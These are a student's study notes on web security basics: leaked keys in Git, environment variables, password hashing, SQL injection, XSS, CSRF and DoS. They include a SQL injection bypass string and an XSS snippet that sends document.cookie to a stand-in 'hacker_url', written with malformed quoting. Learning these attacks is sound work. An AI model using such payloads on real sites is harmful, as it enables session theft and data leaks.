## Security 

***Git***
- open source - everyone can see it. 
	- people can find bug to fix or exploite
- people can login your acocunts

- accidentally commit with access token or keys



HTTP vs HTTPS
- share-key cryptography 
- public key cryptography


Environment variable
- instead of putting token or key in the code, use environment variables.
- The environment variables is variable locate to the operating system
- flask example, app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY")



Storing username and password hash
	- take username and password from user, run the password thru hash function, then compare with the hash in the database
	- 


SQL Injection
	- injecting sql code to run on the remote database and leak data 
	- 1' OR '1' = '1'
	- SELECT * FROM users 
		WHERE (username = 'alice')
		AND (password = '1' OR '1' = '1')     <-- this will return true

	- whereever user's input is put into a sql query, will need to escape any special characters that can potentially be part of the sql query 



API key
	- when make API request, need to submit the request with key
	- with api key, can limit request base on key and implement route authentication 


JavaScript 
	- cross site scripting - malicious user get someone to click on the browser link and that run some javascript on the broswer
	- injecting javascript code to database and run when user request data and browser render it

Chrome has built-in cross-script 
~~~
chrome --disable-xss-auditor
~~~

img src will run the request automatically when try to render the page
~~~
<script type="text/javascript">
	document.write('<img src="hacker_url?cookies="+document.cookie+">"")
</script>

~~~


~~~
<script type="text/javascript">
	window.location="some_url"
</script>

~~~


cross-site request forgery 
	- forgy request to another website that user might be login to 


User account permission 
	- link one platform to another. Multiple mediums to conpromise data

DoS
	- multiple requests from the same machine 

DDoS 
	- multiple requests from many machines
	- battle of resources, need to be deal with at the server or isp level 
	- limit request, blacklisting 


OWASP Top 10
















